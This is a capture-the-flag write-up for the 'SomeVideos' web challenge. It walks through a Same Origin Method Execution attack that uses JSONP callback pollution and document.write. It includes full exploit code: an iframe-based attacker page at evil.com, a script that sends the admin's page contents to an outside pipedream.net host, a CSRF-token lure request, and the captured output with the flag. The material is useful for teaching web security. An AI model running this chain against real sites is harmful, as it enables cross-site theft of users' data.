# SomeVideos
* Category: Web
* 400 Points
* Solved by the JCTF Team (after the competition)

## Description
> A friend of mine called me and said that he wants to share some videos with his family, I told him that I'm working on such platform right now and that he should call me back later.
> 
> Credentials: If not exist, any user you login will be created



## Preface

This one is really complicated and really cool. We weren't able to solve it during the competition (only one team got it, impressive!). After the competition ended, we got the following resources from the one of the CTF creators (thanks!):

* https://vulnerabledoma.in/xss_2020-06/
* http://challenge.benhayak.com/mini_2020/
* https://t.co/P94MqTbnUZ?amp=1
* http://www.benhayak.com/2019/07/blog-post.html
* http://solutions.terjanq.me/2020-06-18-ben/index.html

They all describe an attack called "Same Origin Method Execution (SOME)" (as hinted in the challenge name). The following solution is heavily based on [this PoC](https://l0.cm/xss_202006/solution.html).

## Solution

### The Website

We are given a website which hosts videos. After logging in, we are able to view an featured video, upload videos or view a list of our uploaded videos.

In order to upload a video, we need to provide:
* A title (max 13 characters, enforced by both client side and server side)
* A description (free text)
* A URL to the video ('url' type enforced by client side only)

Once we upload a video, it receives a UUID and we can then view it via the `view` page by providing its UUID, e.g. `https://somevideos.appsecil.ctf.today/videos/view?id=40c7a01b-836b-45ee-b776-98676eb56cc7`.

The `view` page has some interesting Javascript:

```javascript
      function loadVideo({ success, data }) {
      	if (!success) {
      		alert(`Error - ${data}`);
      		return;
      	}
      
      	// Hippity hoppity changing some proprieties ʕ•ᴥ•ʔ
      	document.querySelector('#video-title').innerText = data.title;
      	document.querySelector('#video-desc').innerHTML = data.description;
      	document.querySelector('#video-view').src = data.source;
      }
      
      const videoId = new URL(location).searchParams.get('id');
      
      if (videoId) {
      	// Basic jsonp implementation
      	const script = document.createElement('script');
      	script.src = `/videos/embed?id=${videoId}&callback=loadVideo`;
      	// Delete script from the DOM when failed / successed
      	['load', 'error'].forEach(e => {
      		script.addEventListener(e, () => script.remove());
      	});
      	// We are ready to go, load it !
      	document.body.appendChild(script);
      }
      
      // TODO: Add a way to call this function 
      // NOTE: Let the admin decide if this video is suitable for public listing
      // function requestListing() {
      // 	fetch(`/videos/listing-request`, {
      // 		method: 'POST',
      // 		headers: {
      // 			'Content-Type': 'application/x-www-form-urlencoded'
      // 		},
      // 		body: new URLSearchParams({
      // 			csrf: 'ELT+o9BwjBfvY4lpXg8SYQzNtlAJP8Fs6POEdTC9ZfA=',
      // 			url: window.location
      // 		})
      // 	});
      // }
      
      if (location.hash == '#debug') {
      	console.log('Current anti CSRF token is ELT+o9BwjBfvY4lpXg8SYQzNtlAJP8Fs6POEdTC9ZfA=');
      	// Easy way to display objects within a string
      	Object.prototype.toString = function () {
      		return JSON.stringify(this);
      	};
      }
```

We can see that the `videoId` is received from the URL. Using `JSONP`, the video details are fetched, by calling `/videos/embed?id=${videoId}&callback=loadVideo`.

The `/videos/embed` JSONP endpoint returns output such as:
```javascript
loadVideo({"success":true,"data":{"title":"My Title","description":"My&#x20;Description","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}});
```

Using the JSONP callback (`loadVideo`), the details are then populated in the appropriate HTML elements.

Notice that the description is populated by setting `innerHTML`, so if we can enter HTML into the description, we can execute code. However, this is a red herring, since the description field is escaped on the server side and no HTML tags are allowed. This might be a good opportunity to mention that the "title" did allow entering raw `<` and `>` characters, but it was populated using `innerText` so they weren't parsed as HTML.

Another interesting observation is the commented-out code, which allows sending to the administrator a URL which he will later visit. This hints towards a client-side attack, where we send the administrator to a page containing a malicious payload and steal some data from him (e.g. his cookie) or execute something on his behalf.

During the competition we noticed that we can use HPP (HTTP Parameter Pollution) in order to control the callback called via JSONP. For example, if we send `40c7a01b-836b-45ee-b776-98676eb56cc7%26callback=alert%23#debug` as the video ID, the JSONP script source is interpreted as:
```
/videos/embed?id=40c7a01b-836b-45ee-b776-98676eb56cc7&callback=alert#&callback=loadVideo
```

This translates to:
```javascript
alert({"success":true,"data":{"title":"My Title","description":"My&#x20;Description","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}});
```

Which in turn alerts these details on the video page. However, there were some limitations to this ability:
* The callback function name was apparently limited to `[a-zA-Z0-9_\.]`
* The parameter to the callback was only partially controllable (we could only control the contents of "title", "description" and "source" according to the constraints we've listed above)

So, apart from alerting or logging to the console, we couldn't find anything useful to do with the HPP ability. At least, until after the competition, when we read about SOME.

### The Attack

We won't go into explaining SOME in depth since it's really out of the scope of this writeup, so before continuing it's recommended to take the time and review [this post](http://www.benhayak.com/2015/06/same-origin-method-execution-some.html) (or any other resource) in order to understanding in general why this attack is possible.

High-level overview of our attack:
* Smuggle some HTML in chunks via the video title
   * We'd like to smuggle something like `<script>/*script content*/</script>`
* Use `document.write` as the JSONP callback to render the HTML
   * This will execute the Javascript


#### 1. Hiding the HTML

We create five videos, each one with a different title. The example we'll run with is:

| Title | UUID |
| ----- | ---- |
| `<script>/*` | 48a1e399-be90-4d8b-90ad-6ab397357601 |
| `*/eval(/*` | 20489263-0089-4ba6-8a17-d9636bbb2427 | 
| `*/top[1]/*` | 49b45827-6a3d-41ec-bcd6-6d9b83410221 | 
| `*/.name)//` | 5a835c81-26f9-427e-ba80-95aecd7d0c03 |
| `</script>` | 883fd186-24c8-480d-98b4-0c1e47e72fd2 |

#### 2. Collecting the HTML and Rendering it

We create an HTML page on our own server (`http://evil.com/some.html`):

```html
<iframe src="https://somevideos.appsecil.ctf.today/" name="x" onload="go()"></iframe>
<iframe id="y" name="s = document.createElement('script'); s.src='http://evil.com/some.js';document.head.appendChild(s);"></iframe>

<script>
function loadIframe(uid){
    return new Promise(resolve => {
        y.src = `https://somevideos.appsecil.ctf.today/videos/view?id=${uid}%26callback=top.x.document.write%23#debug`;
        y.onload = function(){
            return resolve(this);
        }
    });
}

async function go(){
    await loadIframe("48a1e399-be90-4d8b-90ad-6ab397357601"); // <script>/*
    await loadIframe("20489263-0089-4ba6-8a17-d9636bbb2427"); // */eval(/*
    await loadIframe("49b45827-6a3d-41ec-bcd6-6d9b83410221"); // */top[1]/*
    await loadIframe("5a835c81-26f9-427e-ba80-95aecd7d0c03"); // */.name)//
    await loadIframe("883fd186-24c8-480d-98b4-0c1e47e72fd2"); // </script>
}
</script>
```

When someone visits this page, what will happen is:

1. The `x` iframe will load the target website
2. When the iframe has fully loaded, it will call `go()`
3. `go()` will start smuggling the HTML into the `x` iframe via the `y` iframe. Each time, it will call `top.x.document.write` writing the current JSON object to the DOM.
4. When all the HTML is smuggled to the DOM, we end up with:

```html
{"success":true,"data":{"title":"<script>/*","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"*/eval(/*","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"*/top[1]/*","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"*/.name)//","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}{"success":true,"data":{"title":"</script>","description":"test","source":"https://test-videos.co.uk/vids/bigbuckbunny/mp4/h264/1080/Big_Buck_Bunny_1080_10s_20MB.mp4"}}
```

5. This, of course, translated to `<script>eval(top[1].name)</script>`, meaning that we are executing the iframe name as Javascript
6. For our own convenience, the Javascript code hidden in the iframe name just loads another javascript file where we can easily develop our real exploit logic

#### 3. The Real Exploit Logic

In our case, we'll just fetch the administrators personal `videos` page and send it to our server:

```javascript
fetch('https://en71jkw9fg9w2.x.pipedream.net/?loaded')

fetch('https://somevideos.appsecil.ctf.today/videos/').then(function (response) {
	// The API call was successful!
	return response.text();
}).then(function (html) {
	// This is the HTML from our response as a text string
	fetch('https://en71jkw9fg9w2.x.pipedream.net/?videos', {
    method: 'post',
    body: html
  })
}).catch(function (err) {
	// There was an error
	fetch('https://en71jkw9fg9w2.x.pipedream.net/?error=' + err)
});
```

#### 4. Luring the Admin

We'll just use the commented-out API that we've seen before:

```javascript
fetch("/videos/listing-request", {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
      csrf: 'ELT+o9BwjBfvY4lpXg8SYQzNtlAJP8Fs6POEdTC9ZfA=',
      url: 'http://evil.com/some.html'
    })
  });
```

#### 5. The Reward

After a few seconds, we get a hit on our server with the admin's personal video list:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SomeVideos</title>
    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bulma@0.9.1/css/bulma.min.css">
  </head>
  <body>
    <nav class="navbar is-dark">
      <div class="container">
        <div class="navbar-brand"><a class="navbar-item" href="/">SomeVideos</a><a class="navbar-burger burger" data-target="#navbar-nain"><span></span><span></span><span></span></a></div>
        <div class="navbar-menu" id="navbar-nain">
          <div class="navbar-end">
            <div class="navbar-item has-dropdown is-hoverable"><a class="navbar-link">admin</a>
              <div class="navbar-dropdown"><a class="navbar-item" href="/videos">Your videos</a>
                <hr class="navbar-divider">
                <div class="navbar-item">
                  <form action="/logout" method="POST">
                    <input type="hidden" name="csrf" value="mRoLB/WcyGN6xCBOyOXOus1Y8ZyeFI7E+NeE6AdK2LI=">
                    <div class="field">
                      <button class="button is-danger" href="/logout">Logout</button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </nav>
    <section class="section">
      <div class="container">
        <div class="columns is-multiline">
          <div class="column is-full">
            <section class="hero is-info">
              <div class="hero-body">
                <div class="container">
                  <h1 class="title">Your videos</h1>
                </div>
              </div>
            </section>
          </div>
          <div class="column is-3">
            <div class="card">
              <header class="card-header">
                <p class="card-header-title">Not The Flag</p>
              </header>
              <div class="card-content">
                <div class="content">AppSec-IL{00p5_un3xp3c73d_54m3_0r161n_m37h0d_3x3cu710n}</div>
              </div>
              <footer class="card-footer"><a class="card-footer-item" href="/videos/view?id=26f82b25-315c-45d4-98bb-add7ddd0be45">View</a></footer>
            </div>
          </div>
          <div class="column is-3">
            <div class="card">
              <header class="card-header">
                <p class="card-header-title">Big Buk Bunny</p>
              </header>
              <div class="card-content">
                <div class="content">A large and lovable rabbit deals with three tiny bullies, led by a flying squirrel, who are determined to squelch his happiness.</div>
              </div>
              <footer class="card-footer"><a class="card-footer-item" href="/videos/view?id=a5ba7665-61a7-4461-9884-7567c07cbacd">View</a></footer>
            </div>
          </div>
          <div class="column is-full">
            <div class="card">
              <div class="card-header">
                <p class="card-header-title">Add new</p>
              </div>
              <div class="card-content">
                <form action="/videos" method="POST">
                  <input class="input" type="hidden" name="csrf" value="mRoLB/WcyGN6xCBOyOXOus1Y8ZyeFI7E+NeE6AdK2LI=">
                  <div class="field">
                    <div class="control">
                      <input class="input" type="text" name="title" placeholder="Title" maxlength="13">
                    </div>
                  </div>
                  <div class="field">
                    <div class="control">
                      <textarea class="textarea" name="description" placeholder="Description"></textarea>
                    </div>
                  </div>
                  <div class="field">
                    <div class="control">
                      <input class="input" type="url" name="source" placeholder="Source">
                    </div>
                  </div>
                  <div class="field">
                    <button class="button is-info is-fullwidth">Add</button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
    <script>
      // Some JavaScript magic related to burgers ð
      document.querySelectorAll('.navbar-burger').forEach(el => {
      	el.addEventListener('click', () => {
      		const { target } = el.dataset;
      		el.classList.toggle('is-active');
      		document.querySelector(target).classList.toggle('is-active');
      	});
      });
    </script>
  </body>
</html>
```

The flag: `AppSec-IL{00p5_un3xp3c73d_54m3_0r161n_m37h0d_3x3cu710n}`. Really complicated and really cool, right?